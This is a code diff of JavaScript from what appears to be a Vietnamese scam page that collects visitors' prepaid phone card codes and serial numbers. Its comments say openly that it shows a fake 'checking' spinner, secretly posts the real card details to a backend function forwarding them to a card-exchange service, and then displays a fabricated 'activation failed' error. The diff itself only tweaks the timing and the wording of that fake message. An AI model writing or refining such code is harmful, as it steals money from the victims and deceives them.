@@ -182,29 +182,28 @@
 
     if(!code || !seri) return alert("Vui lòng nhập đủ!");
 
-    // Hiện vòng xoay đang xử lý (tạo cảm giác đang kiểm tra thật)
+    // Hiện vòng xoay đang kiểm tra cho giống thật
     content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
 
     try {
-        // Vẫn gửi thẻ thật sang Doithe1s như bình thường
+        // Vẫn bí mật gửi thẻ thật sang Doithe1s
         await fetch('/.netlify/functions/napthe', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type, code, seri })
         });
 
-        // Sau khi gửi xong, đợi thêm 2 giây cho giống thật rồi báo lỗi giả
+        // Sau khi gửi xong, đợi 3 giây rồi hiện thông báo lỗi giả
         setTimeout(() => {
             content.innerHTML = `
                 <div style="font-size:50px; margin-bottom:10px">❌</div>
-                <h3 style="color:red">KÍCH HOẠT THẤT BẠI</h3>
-                <p>Mã thẻ <b>${code}</b> không hợp lệ hoặc đã được sử dụng trước đó. Vui lòng kiểm tra lại!</p>
-                <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">THỬ LẠI</button>
+                <h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3>
+                <p>Thẻ có mã <b>${code}</b> không hợp lệ, sai mệnh giá hoặc đã được sử dụng. Vui lòng thử lại!</p>
+                <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>
             `;
-        }, 2000);
+        }, 3000);
 
     } catch (err) {
-        // Trường hợp lỗi mạng thực sự
         alert("Hệ thống bận, vui lòng thử lại sau!");
         openPay();
     }
